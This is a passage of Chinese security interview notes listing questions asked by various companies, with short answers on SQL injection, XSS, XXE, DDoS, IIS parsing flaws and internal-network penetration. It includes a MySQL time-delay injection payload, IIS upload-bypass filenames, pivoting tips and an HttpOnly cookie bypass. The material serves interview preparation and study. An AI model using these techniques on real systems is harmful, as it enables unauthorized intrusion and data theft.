id="SQL注入写shell的条件，用法">SQL注入写shell的条件，用法</h3><h3 id="GPC是什么？开启了怎么绕过">GPC是什么？开启了怎么绕过</h3><h3 id="Mysql一个-和两个-什么区别">Mysql一个@和两个@什么区别</h3><h3 id="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</h3><h3 id="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</h3><h3 id="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</h3><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p><h3 id="挖过最难的漏洞是什么">挖过最难的漏洞是什么</h3><h2 id="ukelink">ukelink</h2><h3 id="病毒和蠕虫的区别">病毒和蠕虫的区别</h3><h3 id="DNS欺骗是什么">DNS欺骗是什么</h3><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><h3 id="DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</h3><p>SYN攻击 防火墙、特征匹配<br>ACK FLOOD<br>UDP FLOOD<br>ICMP FLOOD<br>CC http的get请求<br>陆地攻击 源IP和目的IP都为同一个<br>UDP DNS QUERY 向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息</p><h3 id="陆地land攻击是什么">陆地land攻击是什么</h3><h3 id="xss有什么？执行存储型的xss的危害和原理">xss有什么？执行存储型的xss的危害和原理</h3><h3 id="渗透测试流程？（不够清晰，太浅显">渗透测试流程？（不够清晰，太浅显</h3><h3 id="有没有移动端的调试经验-apk-ipa包分析">有没有移动端的调试经验 apk,ipa包分析</h3><h3 id="对于云安全的理解">对于云安全的理解</h3><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p><h3 id="虚拟机逃逸的理解">虚拟机逃逸的理解</h3><p>虚拟机之间通信或上层主机的通信</p><h3 id="英语介绍一下自己">英语介绍一下自己</h3><h3 id="职业路径">职业路径</h3><h3 id="大学做过什么相关的事情">大学做过什么相关的事情</h3><h3 id="在工作会做什么来不断提高自己的能力">在工作会做什么来不断提高自己的能力</h3><h2 id="卓望">卓望</h2><h3 id="渗透测试流程">渗透测试流程</h3><h3 id="描述渗透项目，做了什么">描述渗透项目，做了什么</h3><h3 id="xss漏洞类型、详情、修复方案">xss漏洞类型、详情、修复方案</h3><h3 id="SQL注入原理、类型，waf绕过，写shell，提权，修复方案">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</h3><h3 id="终端的渗透经验">终端的渗透经验</h3><h3 id="了解什么比较新的漏洞">了解什么比较新的漏洞</h3><h3 id="企业内部安全">企业内部安全</h3><p>信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭PC、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、IP和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）</p><h2 id="安巽">安巽</h2><h3 id="算法？了解过什么排序？">算法？了解过什么排序？</h3><p>快速排序 冒泡排序</p><h3 id="爬虫">爬虫</h3><h4 id="页面存在很多js的时候，用什么">页面存在很多js的时候，用什么</h4><p>phnatomJS selenium execjs</p><h4 id="爬虫的待爬取URL量级比较大的时候，如何对其去重">爬虫的待爬取URL量级比较大的时候，如何对其去重</h4><ul><li>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取</li><li>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率</li><li>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大</li><li>使用Map或是一个定长数组记录某一个URL是否被访问过</li><li>布隆过滤器(bloom filter)，bitmap</li></ul><h4 id="多线程-异步-协程-多路复用-用哪一个最快-为什么">多线程 异步 协程 多路复用 用哪一个最快 为什么</h4><blockquote><p><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a></p></blockquote><p>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p><p>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。</p><p>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p><p>IO多路复用 异步阻塞IO 线程轮询IO</p><h3 id="浏览器的常用编码">浏览器的常用编码</h3><p>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a></p><h3 id="web常用的加密算法有什么">web常用的加密算法有什么</h3><p>非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA base64</p><h3 id="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</h3><p>拿下机器后<br>内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁  这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的   拿到的各种记录 会暴露出部分内网通讯的ip</p><p>内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p><h3 id="mysql中like查询会会非常缓慢，如何进行优化">mysql中like查询会会非常缓慢，如何进行优化</h3><p>分词索引</p><h3 id="做了cdn的网站如何获取真实IP">做了cdn的网站如何获取真实IP</h3><ol><li>多地ping看是否有cdn</li><li>邮件订阅或者rss订阅</li><li>二级域名可能不会做cdn</li><li>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns</li><li>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a></li><li>phpinfo上显示的信息</li></ol><h3 id="渗透的时候如何隐藏自己的身份">渗透的时候如何隐藏自己的身份</h3><h3 id="主机疑似遭到入侵，要看哪里的日志">主机疑似遭到入侵，要看哪里的日志</h3><h3 id="SQL注入漏洞怎么修复">SQL注入漏洞怎么修复</h3><h2 id="长亭">长亭</h2><h3 id="安全研究的方面？做过哪些渗透测试的工作？">安全研究的方面？做过哪些渗透测试的工作？</h3><h3 id="只给你一个网址，如何进行渗透测试">只给你一个网址，如何进行渗透测试</h3><h3 id="SQL注入，id-1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？">SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</h3><h3 id="sleep被禁用后还能怎么进行sql注入">sleep被禁用后还能怎么进行sql注入</h3><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。<br>mysql：<code>AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</code></p><h3 id="XSS可以控制属性怎么利用">XSS可以控制属性怎么利用</h3><h3 id="CSRF怎么防护？">CSRF怎么防护？</h3><p>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p><h3 id="请求头中哪些是有危害的？">请求头中哪些是有危害的？</h3><p>Cookie</p><h3 id="XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</h3><p>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br>xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的</p><p>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml</p><p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p><p>javax.xml.stream.XMLStreamReader;</p><p>javax.xml.parsers.DocumentBuilderFactory;</p><h3 id="JAVA中间件的漏洞，举几个例子？">JAVA中间件的漏洞，举几个例子？</h3><p>常见的是反序列化漏洞</p><h3 id="IIS常见的漏洞">IIS常见的漏洞</h3><p>常见的为解析漏洞，6.0有<br>/test.asp/test.jpg<br>test.asp;.jpg<br>7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx<br>原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p><h3 id="python有哪些框架，其中出现过哪些漏洞">python有哪些框架，其中出现过哪些漏洞</h3><p>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值<br>如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。<br>还可以利用模板中html标签属性字段绕过xss过滤。</p><p>Django出现过目录遍历漏洞</p><h3 id="业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</h3><h3 id="PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</h3><h3 id="HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</h3><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p><h2 id="盛邦">盛邦</h2><h3 id="有没有做过协议分析和抓包分析">有没有做过协议分析和抓包分析</h3><h2 id="翼果">翼果</h2><h3 id="mysql查看版本？">mysql查看版本？</h3><h3 id="过安全狗">过安全狗</h3><h3 id="编程能力-平台逆向-修改程序入口-rootkit有没有研究过">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</h3><h2 id="深信服-安全开发-实习">深信服(安全开发/实习)</h2><blockquote><p>作者：华电许少 链接：<a href="https://zhuanlan.zhihu.com/p/142929260" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/142929260</a></p></blockquote><h3 id="一面">一面</h3><h4 id="SQL注入如何读写文件，二次注入，防御方式">SQL注入如何读写文件，二次注入，防御方式</h4><h4 id="XSS有哪几种，如何防御">XSS有哪几种，如何防御</h4><h4 id="CSRF和XSS区别，如何防御">CSRF和XSS区别，如何防御</h4><h4 id="文件上传的前后端的绕过，防御方式">文件上传的前后端的绕过，防御方式</h4><h4 id="IIS6-0，Apache，Nginx的文件解析漏洞讲一下">IIS6.0，Apache，Nginx的文件解析漏洞讲一下</h4><h4 id="XXE和SSRF简单讲一下">XXE和SSRF简单讲一下</h4><h4 id="RCE讲一下，PHP函数eval和system，popen的区别">RCE讲一下，PHP函数eval和system，popen的区别</h4><h4 id="Python的迭代器和装饰器讲一下">Python的迭代器和装饰器讲一下</h4><h4 id="缓冲区溢出原理和防御">缓冲区溢出原理和防御</h4><h4 id="内网渗透经验有没有">内网渗透经验有没有</h4><h4 id="多线程和进程讲一下，线程通信以及进程通信方式">多线程和进程讲一下，线程通信以及进程通信方式</h4><h4 id="渗透测试流程讲一下，信息收集都有哪些方面">渗透测试流程讲一下，信息收集都有哪些方面</h4><h4 id="有没有实际渗透经验，讲一下">有没有实际渗透经验，讲一下</h4><h4 id="有没有了解过系统漏洞，windows方面的，比如MS08-06715-你是如何学习渗透的，哪些方式">有没有了解过系统漏洞，windows方面的，比如MS08-06715.你是如何学习渗透的，哪些方式</h4><h3 id="二面">二面</h3><h4 id="虚函数的底层实现">虚函数的底层实现</h4><h4 id="反射的底层实现">反射的底层实现</h4><h4 id="满二叉树和完全二叉树">满二叉树和完全二叉树</h4><h4 id="Python和Java的垃圾回收讲一下">Python和Java的垃圾回收讲一下</h4><h4 id="SQL手工注入流程">SQL手工注入流程</h4><h4 id="Java框架的控制反转怎么实现的">Java框架的控制反转怎么实现的</h4><h4 id="进程通讯有哪些">进程通讯有哪些</h4><h4 id="消息队列的原理">消息队列的原理</h4><h4 id="经典老问题访问百度，重点说一下涉及到的所有协议">经典老问题访问百度，重点说一下涉及到的所有协议</h4><h4 id="常见的web漏洞有哪些">常见的web漏洞有哪些</h4><h4 id="Burpsuite的功能有哪些">Burpsuite的功能有哪些</h4><h4 id="说一下所有的排序算法，哪些是不稳定的">说一下所有的排序算法，哪些是不稳定的</h4><h4 id="图的遍历方式有哪些，基于什么数据结构">图的遍历方式有哪些，基于什么数据结构</h4><h4 id="如何实现一个HTTP代理，原理是什么">如何实现一个HTTP代理，原理是什么</h4><h4 id="你的兴趣爱好是什么">你的兴趣爱好是什么</h4><ul><li><a href="#%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98">技术面试问题</a><ul><li><a href="#ctf">CTF</a><ul><li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%AA%E5%8D%B0%E8%B1%A1%E6%B7%B1%E5%88%BB%E7%9A%84ctf%E7%9A%84%E9%A2%98%E7%9B%AE">说一个印象深刻的CTF的题目</a><ul><li><a href="#sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">sql二次注入</a></li></ul></li></ul></li><li><a href="#python">Python</a><ul><li><a href="#%E7%88%AC%E8%99%AB%E6%A8%A1%E5%9D%97%E6%A1%86%E6%9E%B6%E5%8F%8D%E7%88%AC%E8%99%AB%E6%9C%BA%E5%88%B6ip-%E4%BB%A3%E7%90%86%E6%B1%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%A0%B4%E8%A7%A3ua">爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</a></li><li><a href="#%E5%B9%B6%E5%8F%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%8D%8F%E7%A8%8B%E4%B8%89%E4%B8%AA%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB">并发(多线程、线程池、协程、三个程之间的区别)</a></li><li><a href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E5%87%86%E5%BA%93">常用的标准库</a></li><li><a href="#django%E5%92%8Cflask%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%BF%E7%94%A8">DJANGO和FLASK区别和使用</a></li><li><a href="#orm">ORM</a></li><li><a href="#python%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">python安全工具编写/源码阅读</a></li><li><a href="#%E8%AF%81%E6%98%8E%E8%83%BD%E5%8A%9B">证明能力</a></li></ul></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a><ul><li><a href="#rsa">RSA</a></li><li><a href="#des">DES</a></li><li><a href="#aes">AES</a></li><li><a href="#%E5%9B%BD%E5%86%85sm%E7%B3%BB%E5%88%97">国内SM系列</a></li></ul></li><li><a href="#%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0">风险评估</a><ul><li><a href="#%E6%B5%81%E7%A8%8B">流程</a></li><li><a href="#%E4%B8%89%E8%A6%81%E7%B4%A0">三要素</a></li></ul></li><li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a><ul><li><a href="#fority-sca%E5%AE%A1%E8%AE%A1java%E4%BB%A3%E7%A0%81">Fority SCA审计JAVA代码</a></li><li><a href="#seay%E5%AE%A1%E8%AE%A1php%E4%BB%A3%E7%A0%81">Seay审计PHP代码</a></li><li><a href="#%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">源码阅读</a></li></ul></li><li><a href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B">应急响应具体流程</a><ul><li><a href="#%E6%A8%A1%E5%9E%8B">模型</a></li><li><a href="#%E5%AE%9E%E4%BE%8B">实例</a><ul><li><a href="#ddos">DDOS</a><ul><li><a href="#ddos%E6%98%AF%E4%BB%80%E4%B9%88">DDOS是什么</a></li></ul></li><li><a href="#%E5%AE%9E%E4%BE%8B-1">实例</a></li><li><a href="#%E4%B8%BB%E6%9C%BA%E8%A2%AB%E5%85%A5%E4%BE%B5">主机被入侵</a></li></ul></li></ul></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E7%9B%B8%E5%85%B3">渗透测试流程相关</a><ul><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B">渗透测试流程</a></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE">渗透测试项目</a></li><li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%B7%E4%BD%93%E5%AE%9E%E6%96%BD">渗透测试具体实施</a></li><li><a href="#17%E5%B9%B4owasp-top10">17年OWASP TOP10</a></li><li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">常见的Web安全漏洞</a></li><li><a href="#%E6%8C%96%E8%BF%87%E4%BB%80%E4%B9%88%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">挖过什么逻辑漏洞</a><ul><li><a href="#%E8%AE%A2%E5%8D%95%E4%BB%BB%E6%84%8F%E9%87%91%E9%A2%9D%E4%BF%AE%E6%94%B9">订单任意金额修改</a></li><li><a href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E4%BC%A0">验证码回传</a></li><li><a href="#%E6%9C%AA%E8%BF%9B%E8%A1%8C%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81%E9%AA%8C%E8%AF%81">未进行登陆凭证验证</a></li><li><a href="#%E6%8E%A5%E5%8F%A3%E6%97%A0%E9%99%90%E5%88%B6%E6%9E%9A%E4%B8%BE">接口无限制枚举</a></li><li><a href="#cookie%E8%AE%BE%E7%BD%AE%E5%AD%98%E5%9C%A8%E7%BC%BA%E9%99%B7">cookie设置存在缺陷</a></li></ul></li><li><a href="#%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E7%BC%BA%E9%99%B7">找回密码功能缺陷</a></li><li><a href="#%E4%BD%A0%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E6%98%AF%E5%93%AA%E4%B8%AA">你常用的渗透工具有哪些，最常用的是哪个？</a><ul><li><a href="#%E6%89%AB%E6%8F%8Fnessusawvsnikto">扫描:Nessus,AWVS,Nikto</a></li><li><a href="#sqlmap">SQLmap</a></li><li><a href="#nmap">Nmap</a></li><li><a href="#metasploit">Metasploit</a></li><li><a href="#hydra">Hydra</a></li><li><a href="#kali%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">kali信息收集工具</a></li><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90wireshark">流量分析WireShark</a></li></ul></li><li><a href="#%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%AA%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6%E8%BF%87%E7%9A%84cve%E6%88%96pocms17-010%E6%9C%80%E6%96%B0%E7%9A%84cve">描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5">数据库注入</a><ul><li><a href="#mysql%E9%9D%A2%E8%AF%95%E9%A2%98">MySQL面试题</a><ul><li><a href="#mysql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E">MySQL存储引擎？</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8B%E5%8A%A1">什么是事务？</a></li><li><a href="#%E8%AF%BB%E9%94%81%E5%92%8C%E5%86%99%E9%94%81">读锁和写锁</a></li><li><a href="#mysql%E7%9A%84%E7%B4%A2%E5%BC%95">MySQL的索引</a></li><li><a href="#order-by%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%9A%84%E8%BF%90%E7%94%A8">ORDER BY在注入的运用</a></li><li><a href="#gpc%E6%98%AF%E4%BB%80%E4%B9%88gpc%E4%B9%8B%E5%90%8E%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87">GPC是什么？GPC之后怎么绕过？</a></li><li><a href="#mysql%E4%B8%80%E4%B8%AA%E5%92%8C%E4%B8%A4%E4%B8%AA%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">Mysql一个@和两个@什么区别</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0">注入/绕过常用的函数</a></li><li><a href="#mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B">MySQL存储过程</a></li><li><a href="#%E5%90%84%E7%A7%8D%E5%86%99shell%E7%9A%84%E9%97%AE%E9%A2%98">各种写shell的问题</a></li></ul></li><li><a href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">注入类型</a></li><li><a href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86">SQL注入的原理</a></li><li><a href="#%E8%BF%87waf">过waf</a></li><li><a href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1">如何进行SQL注入的防御</a></li><li><a href="#mysql%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A550%E4%BB%A5%E4%B8%8A%E5%92%8C50%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li><li><a href="#sql%E5%92%8Cnosql%E7%9A%84%E5%8C%BA%E5%88%AB">SQL和NoSQL的区别</a><ul><li><a href="#sql%E4%BC%98%E7%82%B9">SQL优点</a></li><li><a href="#sql%E7%BC%BA%E7%82%B9">SQL缺点</a></li><li><a href="#nosql%E4%BC%98%E7%82%B9">NoSQL优点</a></li><li><a href="#%E6%AF%94%E8%BE%83">比较</a></li><li><a href="#mongodb%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">MongoDB注入方式</a></li></ul></li></ul></li><li><a href="#xss-csrf-xxe">XSS CSRF XXE</a><ul><li><a href="#csrf-%E5%92%8C-xss-%E5%92%8C-xxe-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</a></li><li><a href="#csrfssrf%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">CSRF、SSRF和重放攻击有什么区别？</a></li><li><a href="#%E5%95%A5%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%B7%A8%E5%9F%9F%E6%9C%89%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F">啥是同源策略，跨域有几种方式？</a></li><li><a href="#%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">如何规避同源策略？</a><ul><li><a href="#jsonp">JSONP</a><ul><li><a href="#jsonp%E7%9A%84%E5%8A%AB%E6%8C%81">JSONP的劫持</a></li></ul></li><li><a href="#websocket">WebSocket</a></li><li><a href="#cors%E9%87%8D%E7%82%B9">CORS(重点)</a><ul><li><a href="#%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83">与JSONP的比较</a></li></ul></li></ul></li><li><a href="#dom-xss%E4%B8%8E%E5%8F%8D%E5%B0%84xss%E6%9C%89%E5%95%A5%E4%B8%8D%E5%90%8C%EF%BC%8C%E7%BB%99%E4%BD%A010s%EF%BC%8C%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAxss%E6%98%AF%E5%90%A6%E6%98%AFdom-xss%EF%BC%9F">DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</a></li><li><a href="#csp%E7%AD%96%E7%95%A5">CSP策略</a></li><li><a href="#ssrf%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%97%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E4%BC%AA%E5%8D%8F%E8%AE%AE">SSRF漏洞原理是什么？利用时有哪些伪协议？</a><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#ssrf%E7%94%A8%E5%A4%84">ssrf用处</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%84">漏洞处</a></li><li><a href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">绕过姿势</a></li><li><a href="#%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE">利用协议</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li></ul></li><li><a href="#%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AB%AFreferer%E5%8F%AF%E4%BB%A5%E7%AF%A1%E6%94%B9%E5%90%97">在浏览器端，Referer可以篡改吗？</a></li><li><a href="#xss%E7%9B%B2%E6%89%93%E5%88%B0%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%88%A9%E7%94%A8">xss盲打到内网服务器的利用</a></li><li><a href="#xss%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1">xss代码层防御</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">文件上传下载遍历漏洞</a><ul><li><a href="#%E5%8E%9F%E7%90%86">原理</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">修复方案</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含漏洞</a><ul><li><a href="#%E7%B1%BB%E5%9E%8B">类型</a></li><li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0">PHP文件包含函数</a></li><li><a href="#%E5%88%A9%E7%94%A8">利用</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-1">修复方案</a></li></ul></li><li><a href="#web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%BC%B1%E7%82%B9">web框架漏洞弱点</a><ul><li><a 